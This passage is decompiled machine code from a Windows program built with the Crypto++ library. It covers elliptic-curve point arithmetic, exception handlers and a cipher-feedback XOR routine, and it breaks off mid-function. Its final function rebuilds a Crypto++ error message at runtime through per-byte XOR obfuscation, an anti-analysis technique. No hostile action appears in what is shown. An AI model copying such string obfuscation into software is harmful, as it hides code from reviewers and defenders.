  void *Memory; // [rsp+60h] [rbp-28h]

  v6 = a4;
  v7 = a3;
  v8 = a2;
  v9 = a1;
  _mm_storeu_si128((__m128i *)v22, (__m128i)0i64);
  v23 = 0i64;
  v10 = ((unsigned __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(a1 + 104) - *(_QWORD *)(a1 + 96))
                                              * (signed __int128)7378697629483820647i64) >> 64) >> 63)
      + ((signed __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(a1 + 104) - *(_QWORD *)(a1 + 96))
                                            * (signed __int128)7378697629483820647i64) >> 64) >> 4);
  v11 = *(_QWORD *)(a5 + 104) - *(_QWORD *)(a5 + 96);
  v12 = v10
      + ((signed __int64)((unsigned __int128)(v11 * (signed __int128)7378697629483820647i64) >> 64) >> 4)
      + ((unsigned __int64)((unsigned __int128)(v11 * (signed __int128)7378697629483820647i64) >> 64) >> 63);
  if ( v12 )
  {
    if ( v12 > 0x333333333333333i64 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    sub_140053320((__int64 *)v22, v12);
  }
  sub_1400514F0(v9, v7, (__int64)v22, v6);
  sub_1400514F0(a5, v7, (__int64)v22, a6);
  v13 = (__int64 *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 24i64))(v7);
  v14 = (void **)v22[1];
  v15 = (void **)v22[0];
  v16 = sub_14004CAF0((__int64)&v24, v13, (__int64)v22[0], (__int64)v22[1]);
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v7 + 16i64))(v7, v8, v16);
  v17 = Memory;
  memset(Memory, 0, 8 * v25);
  free(v17);
  if ( v15 )
  {
    if ( v15 != v14 )
    {
      v18 = v15 + 8;
      do
      {
        v19 = *v18;
        memset(*v18, 0, 8i64 * (_QWORD)*(v18 - 1));
        free(v19);
        v20 = *(v18 - 5);
        memset(*(v18 - 5), 0, 8i64 * (_QWORD)*(v18 - 6));
        free(v20);
        v18 += 10;
      }
      while ( v18 - 8 != v14 );
    }
    operator delete(v15);
  }
  return v8;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014004EBE0) ----------------------------------------------------
__int64 __fastcall sub_14004EBE0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v6; // rbp
  __int64 v7; // rbx
  __int64 v8; // rsi
  __int64 *v9; // r14
  unsigned int *v10; // rdx
  unsigned int v11; // eax
  __int64 v12; // rax
  int v13; // edi
  __int64 v14; // rbp
  unsigned int v15; // eax
  unsigned int v16; // er15
  char *v17; // r12
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rax
  __int64 v21; // rax
  __int64 v22; // rdi
  __int64 v23; // rbx
  __int64 v24; // rax
  unsigned int v25; // esi
  __int64 v26; // rbp
  unsigned int v27; // ebx
  unsigned int v28; // ebp
  __int64 v29; // rax
  __int64 v30; // rbx
  int v31; // esi
  __int64 v32; // r13
  __int64 v33; // rax
  __int64 v34; // rbx
  int v35; // er13
  unsigned int v36; // edi
  __int64 v37; // rsi
  __int64 v38; // rax
  unsigned int v39; // esi
  unsigned int v40; // edi
  int v41; // er13
  int i; // er15
  int v43; // ebp
  int v44; // ebx
  __int64 v45; // rax
  __int64 v46; // rax
  void *v47; // rdx
  void (__fastcall ***v48)(_QWORD, _QWORD); // rdi
  __int64 v49; // rbx
  char v51; // [rsp+20h] [rbp-B8h]
  unsigned int v52; // [rsp+24h] [rbp-B4h]
  unsigned int v53; // [rsp+28h] [rbp-B0h]
  int v54; // [rsp+2Ch] [rbp-ACh]
  int v55; // [rsp+30h] [rbp-A8h]
  unsigned int v56; // [rsp+34h] [rbp-A4h]
  __int64 v57; // [rsp+38h] [rbp-A0h]
  char *v58; // [rsp+40h] [rbp-98h]
  char v59; // [rsp+48h] [rbp-90h]
  __int64 v60; // [rsp+58h] [rbp-80h]
  void *Memory; // [rsp+60h] [rbp-78h]
  __int64 v62; // [rsp+70h] [rbp-68h]
  __int64 v63; // [rsp+78h] [rbp-60h]
  void *v64; // [rsp+80h] [rbp-58h]
  char *v65; // [rsp+88h] [rbp-50h]
  __int64 v66; // [rsp+E8h] [rbp+10h]
  __int64 v67; // [rsp+F0h] [rbp+18h]
  __int64 v68; // [rsp+F8h] [rbp+20h]

  v68 = a4;
  v67 = a3;
  v66 = a2;
  v63 = -2i64;
  v6 = a4;
  v7 = a3;
  v8 = a2;
  v9 = a1;
  v54 = 0;
  v53 = sub_140045340(a6);
  v52 = sub_140045340(v6);
  v10 = &v53;
  if ( v52 >= v53 )
    v10 = &v52;
  v11 = *v10;
  v56 = v11;
  if ( v11 )
  {
    if ( v11 > 0x2E )
      v13 = (v11 > 0x104) + 2;
    else
      v13 = 1;
    v53 = v13;
    v14 = (unsigned int)(1 << v13);
    v52 = 1 << v13;
    v15 = 1 << v13 << v13;
    v16 = v15;
    v62 = v15;
    sub_14004DE20(&v64, v15);
    v17 = (char *)v64;
    sub_14003C670((__int64)v64 + 40, v7);
    sub_14003C670((__int64)&v17[40 * v14], a5);
    v18 = *v9;
    if ( v13 == 1 )
    {
      v19 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v18 + 24))(v9, v7, a5);
      sub_14003C670((__int64)(v17 + 120), v19);
    }
    else
    {
      v20 = (*(__int64 (__fastcall **)(__int64 *, __int64))(v18 + 48))(v9, v7);
      sub_14003C670((__int64)(v17 + 80), v20);
      v55 = 2 * v14;
      v58 = &v17[40 * (unsigned int)(2 * v14)];
      v21 = (*(__int64 (__fastcall **)(__int64 *, __int64))(*v9 + 48))(v9, a5);
      sub_14003C670((__int64)&v17[40 * (unsigned int)(2 * v14)], v21);
      if ( (unsigned int)v14 > 3 )
      {
        v22 = (__int64)(v17 + 120);
        v23 = ((unsigned int)(v14 - 4) >> 1) + 1;
        do
        {
          v24 = (*(__int64 (__fastcall **)(__int64 *, __int64, char *))(*v9 + 24))(v9, v22 - 80, v17 + 80);
          sub_14003C670(v22, v24);
          v22 += 80i64;
          --v23;
        }
        while ( v23 );
      }
      if ( (unsigned int)v14 > 1 )
      {
        v25 = v14 + 1;
        v26 = ((unsigned int)(v14 - 2) >> 1) + 1;
        v57 = (unsigned int)v26;
        do
        {
          v27 = v25;
          if ( v25 < v16 )
          {
            v28 = v52;
            do
            {
              v29 = (*(__int64 (__fastcall **)(__int64 *, char *, __int64))(*v9 + 24))(v9, &v17[40 * (v27 - v28)], a5);
              sub_14003C670((__int64)&v17[40 * v27], v29);
              v27 += v28;
            }
            while ( v27 < v16 );
            v26 = v57;
          }
          v25 += 2;
          v57 = --v26;
        }
        while ( v26 );
        LODWORD(v14) = v52;
      }
      v30 = (unsigned int)(3 * v14);
      v31 = 2 * v14;
      if ( (unsigned int)v30 < v16 )
      {
        v32 = (__int64)v58;
        do
        {
          v33 = (*(__int64 (__fastcall **)(__int64 *, char *, __int64))(*v9 + 24))(
                  v9,
                  &v17[40 * (unsigned int)(v30 - v31)],
                  v32);
          sub_14003C670((__int64)&v17[40 * v30], v33);
          v30 = (unsigned int)(v31 + v30);
        }
        while ( (unsigned int)v30 < v16 );
      }
      if ( (unsigned int)v14 < v16 )
      {
        v34 = (unsigned int)(v14 + 2);
        v35 = v14 - 2;
        do
        {
          v36 = v34;
          if ( (unsigned int)v34 < (signed int)v34 + v35 )
          {
            v37 = (__int64)&v17[40 * v34];
            do
            {
              v38 = (*(__int64 (__fastcall **)(__int64 *, char *, __int64))(*v9 + 24))(v9, &v17[40 * (v36 - 1)], v67);
              sub_14003C670(v37, v38);
              v36 += 2;
              v37 += 80i64;
            }
            while ( v36 < (signed int)v34 + v35 );
            v16 = v62;
            v31 = v55;
          }
          v34 = (unsigned int)(v31 + v34);
        }
        while ( (signed int)v34 - 2 < v16 );
        LODWORD(v14) = v52;
      }
    }
    sub_14003C210(&v59);
    v39 = 0;
    v40 = 0;
    v41 = v56 - 1;
    v51 = 1;
    for ( i = v56 - 1; i >= 0; --i )
    {
      v39 = (unsigned __int8)sub_140048010(v68, i) + 2 * v39;
      v40 = (unsigned __int8)sub_140048010(a6, i) + 2 * v40;
      if ( !i || 2 * v39 >= (unsigned int)v14 || 2 * v40 >= (unsigned int)v14 )
      {
        v43 = v41 - i;
        v44 = 0;
        v41 = i;
        while ( (v39 || v40) && !(v39 & 1) && !(v40 & 1) )
        {
          v39 >>= 1;
          v40 >>= 1;
          --v43;
          ++v44;
        }
        if ( v51 )
        {
          sub_14003C670((__int64)&v59, (__int64)&v17[40 * (v39 + (v40 << v53))]);
          v51 = 0;
        }
        else
        {
          for ( ; v43; --v43 )
          {
            v45 = (*(__int64 (__fastcall **)(__int64 *, char *))(*v9 + 48))(v9, &v59);
            sub_14003C670((__int64)&v59, v45);
          }
          if ( v39 || v40 )
            (*(void (__fastcall **)(__int64 *, char *, char *))(*v9 + 64))(v9, &v59, &v17[40 * (v39 + (v40 << v53))]);
        }
        for ( ; v44; --v44 )
        {
          v46 = (*(__int64 (__fastcall **)(__int64 *, char *))(*v9 + 48))(v9, &v59);
          sub_14003C670((__int64)&v59, v46);
        }
        v40 = 0;
        v39 = 0;
        LODWORD(v14) = v52;
      }
    }
    v8 = v66;
    sub_14003C000(v66, (__int64)&v59);
    v54 = 1;
    v47 = Memory;
    memset(Memory, 0, 8 * v60);
    free(v47);
    if ( v17 )
    {
      v48 = (void (__fastcall ***)(_QWORD, _QWORD))v17;
      v49 = (__int64)v65;
      if ( v17 != v65 )
      {
        do
        {
          (**v48)(v48, 0i64);
          v48 += 5;
        }
        while ( v48 != (void (__fastcall ***)(_QWORD, _QWORD))v49 );
      }
      operator delete(v17);
    }
  }
  else
  {
    v12 = (*(__int64 (__fastcall **)(__int64 *))(*v9 + 16))(v9);
    sub_14003C000(v8, v12);
  }
  return v8;
}

//----- (000000014004F0B0) ----------------------------------------------------
void __noreturn sub_14004F0B0()
{
  _QWORD *v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v7; // [rsp+88h] [rbp-20h]

  v0 = sub_140050480(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  if ( v7 >= 0x10 )
    operator delete(Src);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4300: using guessed type int _TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__;

//----- (000000014004F170) ----------------------------------------------------
void __noreturn sub_14004F170()
{
  _QWORD *v0; // rbx
  __int64 (__fastcall **v1)(void *); // [rsp+30h] [rbp-78h]
  int v2; // [rsp+48h] [rbp-60h]
  char Dst; // [rsp+50h] [rbp-58h]
  __int64 v4; // [rsp+60h] [rbp-48h]
  __int64 v5; // [rsp+68h] [rbp-40h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v7; // [rsp+88h] [rbp-20h]

  v0 = sub_140050480(&Src);
  std::exception::exception((std::exception *)&v1);
  v1 = &off_1400A8798;
  v2 = 0;
  v5 = 15i64;
  v4 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v1 = &off_1400A8798;
  if ( v7 >= 0x10 )
    operator delete(Src);
  v1 = &off_1400A8798;
  CxxThrowException(&v1, &_TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4300: using guessed type int _TI4_AUcls_077___cls_069_VFilter_CryptoPP___CryptoPP__;

//----- (000000014004F230) ----------------------------------------------------
signed __int64 __fastcall sub_14004F230(unsigned __int64 a1)
{
  signed __int64 result; // rax
  char v2; // [rsp+28h] [rbp-80h]
  __int64 v3; // [rsp+38h] [rbp-70h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v5)(void *); // [rsp+50h] [rbp-58h]
  int v6; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v8; // [rsp+80h] [rbp-28h]
  __int64 v9; // [rsp+88h] [rbp-20h]

  result = 0x3FFFFFFFFFFFFFFFi64;
  if ( a1 > 0x3FFFFFFFFFFFFFFFi64 )
  {
    v4 = 15i64;
    v3 = 0i64;
    v2 = 0;
    sub_140004F20(&v2, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v5);
    v5 = &off_1400A8798;
    v6 = 1;
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v5 = &off_1400A8798;
    CxxThrowException(&v5, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (000000014004F320) ----------------------------------------------------
signed __int64 __fastcall sub_14004F320(__int64 a1)
{
  __int64 v1; // rdi
  _BYTE *v2; // rbx
  signed __int64 v3; // rdx
  _BYTE *v4; // rax
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x130ui64);
  if ( v2 )
  {
    v3 = v1 - 8;
    if ( v1 == 8 )
      v4 = 0i64;
    else
      v4 = (_BYTE *)(v3 + 16);
    v2[16] = *v4;
    *((_DWORD *)v2 + 6) = *(_DWORD *)(v3 + 24);
    sub_14004DA90((__int64)(v2 + 32), v3 + 32);
    *(_QWORD *)v2 = &off_1400B2EE0;
    *((_QWORD *)v2 + 1) = off_1400AB2A0;
  }
  else
  {
    v2 = 0i64;
  }
  if ( v2 )
    result = (signed __int64)(v2 + 8);
  else
    result = 0i64;
  return result;
}
// 1400AB2A0: using guessed type __int64 (__fastcall *off_1400AB2A0[2])();
// 1400B2EE0: using guessed type __int64 (__fastcall *off_1400B2EE0)(void *);

//----- (000000014004F3B0) ----------------------------------------------------
_QWORD *__fastcall sub_14004F3B0(__int64 a1)
{
  __int64 v1; // rdi
  _QWORD *v2; // rax
  _QWORD *v3; // rbx

  v1 = a1;
  v2 = operator new(0xC8ui64);
  v3 = v2;
  if ( !v2 )
    return 0i64;
  sub_14004D9A0((__int64)v2, v1);
  *v3 = &off_1400AAF88;
  return v3;
}
// 1400AAF88: using guessed type __int64 (__fastcall *off_1400AAF88)(void *);

//----- (000000014004F410) ----------------------------------------------------
__int64 __fastcall sub_14004F410(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, unsigned __int64 a5)
{
  __int64 v5; // rcx
  unsigned __int64 v6; // r11
  unsigned int v7; // er10
  __int64 v8; // rax
  unsigned __int64 v9; // rsi
  unsigned __int64 v10; // rdi
  unsigned __int64 v11; // rax
  unsigned int v12; // edi
  __m128i v13; // xmm1
  __int64 v14; // rax
  __m128i v15; // xmm1
  __int64 result; // rax
  char v17; // dl

  v5 = 0i64;
  v6 = a2;
  v7 = 0;
  if ( a5 >= 0x20 )
  {
    v8 = (unsigned int)(a5 - 1);
    v9 = v8 + a2;
    v10 = v8 + a3;
    if ( a3 > v8 + a2 || v10 < a2 )
    {
      v11 = a4 + v8;
      if ( (a3 > v11 || v10 < a4) && (a2 > v11 || v9 < a4) )
      {
        v12 = 16;
        do
        {
          v13 = _mm_loadu_si128((const __m128i *)(v5 + a4));
          v14 = v12;
          v7 += 32;
          v12 += 32;
          _mm_storeu_si128((__m128i *)(v5 + a2), _mm_xor_si128(_mm_loadu_si128((const __m128i *)(v5 + a3)), v13));
          _mm_storeu_si128((__m128i *)(v5 + a3), v13);
          v15 = _mm_loadu_si128((const __m128i *)(v14 + a4));
          v5 = v7;
          _mm_storeu_si128((__m128i *)(v14 + a2), _mm_xor_si128(_mm_loadu_si128((const __m128i *)(v14 + a3)), v15));
          _mm_storeu_si128((__m128i *)(v14 + a3), v15);
        }
        while ( v7 < a5 - (a5 & 0x1F) );
      }
    }
  }
  for ( result = v7; v7 < a5; result = v7 )
  {
    v17 = *(_BYTE *)(result + a4);
    ++v7;
    *(_BYTE *)(result + v6) = *(_BYTE *)(result + a3) ^ v17;
    *(_BYTE *)(result + a3) = v17;
  }
  return result;
}

//----- (000000014004F500) ----------------------------------------------------
void *__fastcall sub_14004F500(__int64 a1, void *a2, unsigned __int64 a3, unsigned __int64 a4, unsigned __int64 Size)
{
  const void *v5; // rdi
  void *v6; // rsi

  v5 = (const void *)a3;
  v6 = a2;
  sub_14003A4B0(a3, a4, Size);
  return memcpy(v6, v5, Size);
}

//----- (000000014004F540) ----------------------------------------------------
char __fastcall sub_14004F540(__int64 a1, __int64 *a2)
{
  sub_1400605C0(a2);
  return 0;
}

//----- (000000014004F560) ----------------------------------------------------
__int64 __fastcall sub_14004F560(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 16) + 24i64))();
}

//----- (000000014004F570) ----------------------------------------------------
void __noreturn sub_14004F570()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (000000014004F630) ----------------------------------------------------
void *__fastcall sub_14004F630(__int64 a1, void *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rsi
  void *v6; // rbp
  __int64 v7; // rbx
  signed int v8; // ST20_4

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  sub_14003C210(a2);
  v8 = 1;
  (*(void (__fastcall **)(__int64, void *, __int64, __int64, signed int))(*(_QWORD *)v7 + 168i64))(v7, v6, v5, v4, v8);
  return v6;
}

//----- (000000014004F6B0) ----------------------------------------------------
__int64 __fastcall sub_14004F6B0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rsi
  __int64 v5; // r15
  __int64 v6; // r14
  __int64 v7; // rbx
  __int64 v8; // rdi
  unsigned __int64 v9; // rdx
  __int64 *v10; // rax
  void **v11; // rsi
  void **v12; // rbp
  __int64 v13; // rax
  void *v14; // rdx
  void **v15; // rbx
  void *v16; // rdx
  void *v17; // rdx
  void *v19[2]; // [rsp+30h] [rbp-58h]
  __int64 v20; // [rsp+40h] [rbp-48h]
  char v21; // [rsp+48h] [rbp-40h]
  __int64 v22; // [rsp+58h] [rbp-30h]
  void *Memory; // [rsp+60h] [rbp-28h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  _mm_storeu_si128((__m128i *)v19, (__m128i)0i64);
  v20 = 0i64;
  v8 = *(_QWORD *)(a1 + 104) - *(_QWORD *)(a1 + 96);
  v9 = ((unsigned __int64)((unsigned __int128)(v8 * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)(v8 * (signed __int128)7378697629483820647i64) >> 64) >> 4);
  if ( v9 )
  {
    if ( v9 > 0x333333333333333i64 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    sub_140053320((__int64 *)v19, v9);
  }
  sub_1400514F0(v7, v5, (__int64)v19, v4);
  v10 = (__int64 *)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 24i64))(v5);
  v11 = (void **)v19[1];
  v12 = (void **)v19[0];
  v13 = sub_14004CAF0((__int64)&v21, v10, (__int64)v19[0], (__int64)v19[1]);
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v5 + 16i64))(v5, v6, v13);
  v14 = Memory;
  memset(Memory, 0, 8 * v22);
  free(v14);
  if ( v12 )
  {
    if ( v12 != v11 )
    {
      v15 = v12 + 8;
      do
      {
        v16 = *v15;
        memset(*v15, 0, 8i64 * (_QWORD)*(v15 - 1));
        free(v16);
        v17 = *(v15 - 5);
        memset(*(v15 - 5), 0, 8i64 * (_QWORD)*(v15 - 6));
        free(v17);
        v15 += 10;
      }
      while ( v15 - 8 != v11 );
    }
    operator delete(v12);
  }
  return v6;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014004F830) ----------------------------------------------------
char __fastcall sub_14004F830(__int64 a1)
{
  __int64 v1; // rbx
  unsigned int v2; // esi
  unsigned int v3; // edi
  int v4; // eax
  int v5; // ecx
  bool v6; // zf
  int v7; // ecx

  v1 = a1;
  v2 = (unsigned int)sub_14004C240(a1) << 6;
  if ( *(_BYTE *)(v1 + 94) )
    v3 = 0;
  else
    v3 = *(_DWORD *)(v1 + 80);
  *(_BYTE *)(v1 + 94) = 0;
  LOBYTE(v4) = sub_140048010(v1, v3);
  if ( (_BYTE)v4 )
  {
LABEL_7:
    sub_14003D660(v1, v3);
    v5 = *(_DWORD *)(v1 + 80);
    *(_DWORD *)(v1 + 84) += v3;
    v4 = sub_140049290(v1, 1i64 << v5);
    v6 = *(_BYTE *)(v1 + 92) == 0;
    *(_DWORD *)(v1 + 88) = v4;
    if ( v6 || (LOBYTE(v4) = sub_140048010(v1, *(unsigned int *)(v1 + 80)), !(_BYTE)v4) )
    {
      *(_BYTE *)(v1 + 93) = 0;
    }
    else
    {
      v7 = *(_DWORD *)(v1 + 80);
      *(_BYTE *)(v1 + 93) = 1;
      *(_DWORD *)(v1 + 88) = (1 << v7) - *(_DWORD *)(v1 + 88);
      LOBYTE(v4) = sub_14003D540(v1, v1 + 40);
    }
  }
  else
  {
    while ( v3 < v2 )
    {
      LOBYTE(v4) = sub_140048010(v1, ++v3);
      if ( (_BYTE)v4 )
        goto LABEL_7;
    }
    *(_BYTE *)(v1 + 95) = 1;
  }
  return v4;
}

//----- (000000014004FA80) ----------------------------------------------------
signed __int64 __fastcall sub_14004FA80(__int64 a1)
{
  signed __int64 result; // rax

  if ( a1 )
    result = a1 + 8;
  else
    result = 0i64;
  return result;
}

//----- (000000014004FA90) ----------------------------------------------------
__int64 __fastcall sub_14004FA90(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 + 48) + 112i64))(a1 + 48);
}

//----- (000000014004FAA0) ----------------------------------------------------
_QWORD *__fastcall sub_14004FAA0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DAA88;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DAA88 & 1 )
  {
    v5 = byte_1400DAA87;
  }
  else
  {
    v4 = 69069 * dword_1400DAA40 + 1234567;
    v1 = dword_1400DAA88 | 1;
    dword_1400DAA40 = v4;
    dword_1400DAA88 |= 1u;
    dword_1400DAA38 = HIWORD(dword_1400DAA38) + 36969 * (unsigned __int16)dword_1400DAA38;
    LOBYTE(v4) = (BYTE2(dword_1400DAA44) + 80 * dword_1400DAA44) ^ v4;
    dword_1400DAA44 = HIWORD(dword_1400DAA44) + 18000 * (unsigned __int16)dword_1400DAA44;
    v5 = (((unsigned int)dword_1400DAA3C >> 13) ^ 32 * dword_1400DAA3C ^ dword_1400DAA3C) + v4;
    dword_1400DAA3C ^= ((unsigned int)dword_1400DAA3C >> 13) ^ 32 * (dword_1400DAA3C ^ (dword_1400DAA3C << 12));
    byte_1400DAA87 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DAA88 = v1 | 2;
    byte_1400DAA90[0] = v5 ^ 0x43;
    byte_1400DAA91 = (v5 - 1) ^ 0x69;
    byte_1400DAA92 = (v5 - 2) ^ 0x70;
    byte_1400DAA93 = (v5 - 3) ^ 0x68;
    byte_1400DAA94 = (v5 - 4) ^ 0x65;
    byte_1400DAA95 = (v5 - 5) ^ 0x72;
    byte_1400DAA96 = (v5 - 6) ^ 0x4D;
    byte_1400DAA97 = (v5 - 7) ^ 0x6F;
    byte_1400DAA98 = (v5 - 8) ^ 0x64;
    byte_1400DAA99 = (v5 - 9) ^ 0x65;
    byte_1400DAA9A = (v5 - 10) ^ 0x42;
    byte_1400DAA9B = (v5 - 11) ^ 0x61;
    byte_1400DAA9C = (v5 - 12) ^ 0x73;
    byte_1400DAA9D = (v5 - 13) ^ 0x65;
    byte_1400DAA9E = (v5 - 14) ^ 0x3A;
    byte_1400DAA9F = (v5 - 15) ^ 0x20;
    byte_1400DAAA0 = (v5 - 16) ^ 0x66;
    byte_1400DAAA1 = (v5 - 17) ^ 0x65;
    byte_1400DAAA2 = (v5 - 18) ^ 0x65;
    byte_1400DAAA3 = (v5 - 19) ^ 0x64;
    byte_1400DAAA4 = (v5 - 20) ^ 0x62;
    byte_1400DAAA5 = (v5 - 21) ^ 0x61;
    byte_1400DAAA6 = (v5 - 22) ^ 0x63;
    byte_1400DAAA7 = (v5 - 23) ^ 0x6B;
    byte_1400DAAA8 = (v5 - 24) ^ 0x20;
    byte_1400DAAA9 = (v5 - 25) ^ 0x73;
    byte_1400DAAAA = (v5 - 26) ^ 0x69;
    byte_1400DAAAB = (v5 - 27) ^ 0x7A;
    byte_1400DAAAC = (v5 - 28) ^ 0x65;
    byte_1400DAAAD = (v5 - 29) ^ 0x20;
    byte_1400DAAAE = (v5 - 30) ^ 0x63;
    byte_1400DAAAF = (v5 - 31) ^ 0x61;
    byte_1400DAAB0 = (v5 - 32) ^ 0x6E;
    byte_1400DAAB1 = (v5 - 33) ^ 0x6E;
    byte_1400DAAB2 = (v5 - 34) ^ 0x6F;
    byte_1400DAAB3 = (v5 - 35) ^ 0x74;
    byte_1400DAAB4 = (v5 - 36) ^ 0x20;
    byte_1400DAAB5 = (v5 - 37) ^ 0x62;
    byte_1400DAAB6 = (v5 - 38) ^ 0x65;
    byte_1400DAAB7 = (v5 - 39) ^ 0x20;
    byte_1400DAAB8 = (v5 - 40) ^ 0x73;
    byte_1400DAAB9 = (v5 - 41) ^ 0x70;
    byte_1400DAABA = (v5 - 42) ^ 0x65;
    byte_1400DAABB = (v5 - 43) ^ 0x63;
    byte_1400DAABC = (v5 - 44) ^ 0x69;
    byte_1400DAABD = (v5 - 45) ^ 0x66;
    byte_1400DAABE = (v5 - 46) ^ 0x69;
    byte_1400DAABF = (v5 - 47) ^ 0x65;
    byte_1400DAAC0 = (v5 - 48) ^ 0x64;
    byte_1400DAAC1 = (v5 - 49) ^ 0x20;
    byte_1400DAAC2 = (v5 - 50) ^ 0x66;
    byte_1400DAAC3 = (v5 - 51) ^ 0x6F;
    byte_1400DAAC4 = (v5 - 52) ^ 0x72;
    byte_1400DAAC5 = (v5 - 53) ^ 0x20;
    byte_1400DAAC6 = (v5 - 54) ^ 0x74;
    byte_1400DAAC7 = (v5 - 55) ^ 0x68;
    byte_1400DAAC8 = (v5 - 56) ^ 0x69;
    byte_1400DAAC9 = (v5 - 57) ^ 0x73;
    byte_1400DAACA = (v5 - 58) ^ 0x20;
    byte_1400DAACB = (v5 - 59) ^ 0x63;
    byte_1400DAACC = (v5 - 60) ^ 0x69;
    byte_1400DAACD = (v5 - 61) ^ 0x70;
    byte_1400DAACE = (v5 - 62) ^ 0x68;
    byte_1400DAACF = (v5 - 63) ^ 0x65;
    byte_1400DAAD0 = (v5 - 64) ^ 0x72;
    byte_1400DAAD1 = (v5 - 65) ^ 0x20;
    byte_1400DAAD2 = (v5 - 66) ^ 0x6D;
    byte_1400DAAD3 = (v5 - 67) ^ 0x6F;
    byte_1400DAAD4 = (v5 - 68) ^ 0x64;
    byte_1400DAAD5 = (v5 - 69) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x46ui64 )
  {
    sub_140004790(Src, 0x46ui64, 0i64);
    v5 = byte_1400DAA87;
